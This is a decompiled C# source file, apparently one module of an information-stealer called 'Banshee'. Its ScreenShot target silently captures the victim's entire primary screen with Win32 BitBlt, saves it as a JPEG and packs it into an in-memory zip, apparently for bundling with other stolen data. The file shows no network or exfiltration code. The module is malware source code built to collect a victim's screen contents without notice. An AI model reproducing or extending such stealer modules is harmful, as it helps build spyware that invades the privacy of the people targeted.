﻿using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using Banshee.Helper;
using Banshee.Helper.Data;

namespace Banshee.Targets.Device
{
	// Token: 0x02000061 RID: 97
	public class ScreenShot : ITarget
	{
		// Token: 0x060000FE RID: 254 RVA: 0x00007854 File Offset: 0x00007854
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Rectangle bounds = Screen.PrimaryScreen.Bounds;
			using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb))
			{
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					IntPtr hdc = graphics.GetHdc();
					IntPtr windowDC = NativeMethods.GetWindowDC(NativeMethods.GetDesktopWindow());
					NativeMethods.BitBlt(hdc, 0, 0, bounds.Width, bounds.Height, windowDC, 0, 0, 13369376);
					graphics.ReleaseHdc(hdc);
					NativeMethods.ReleaseDC(NativeMethods.GetDesktopWindow(), windowDC);
					using (MemoryStream memoryStream = new MemoryStream())
					{
						ImageCodecInfo imageCodecInfo = null;
						ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
						for (int i = 0; i < imageEncoders.Length; i++)
						{
							if (string.Equals(imageEncoders[i].MimeType, "image/jpeg", StringComparison.OrdinalIgnoreCase))
							{
								imageCodecInfo = imageEncoders[i];
								break;
							}
						}
						if (imageCodecInfo != null)
						{
							Encoder quality = Encoder.Quality;
							EncoderParameters encoderParameters = new EncoderParameters(1);
							encoderParameters.Param[0] = new EncoderParameter(quality, 90L);
							bitmap.Save(memoryStream, imageCodecInfo, encoderParameters);
						}
						else
						{
							bitmap.Save(memoryStream, ImageFormat.Jpeg);
						}
						byte[] array = memoryStream.ToArray();
						if (array != null && array.Length != 0)
						{
							string entryPath = "screenshot.jpg";
							zip.AddFile(entryPath, array);
						}
					}
				}
			}
		}
	}
}
